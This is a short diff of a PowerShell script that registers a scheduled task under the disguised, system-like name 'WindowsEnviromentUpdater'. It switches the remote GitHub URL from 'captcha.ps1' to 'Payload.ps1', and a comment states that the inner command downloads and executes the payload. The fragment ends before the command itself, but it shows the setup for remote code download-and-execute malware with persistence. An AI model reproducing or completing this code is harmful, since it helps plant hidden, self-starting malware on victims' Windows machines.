@@ -1,5 +1,5 @@
 $TaskName = "WindowsEnviromentUpdater"
-$GitHubUrl = "https://raw.githubusercontent.com/joault/powershell/main/captcha.ps1"
+$GitHubUrl = "https://raw.githubusercontent.com/joault/powershell/main/Payload.ps1"
 
 # Inner command: downloads and executes your payload from GitHub
 $InnerCommand = @"
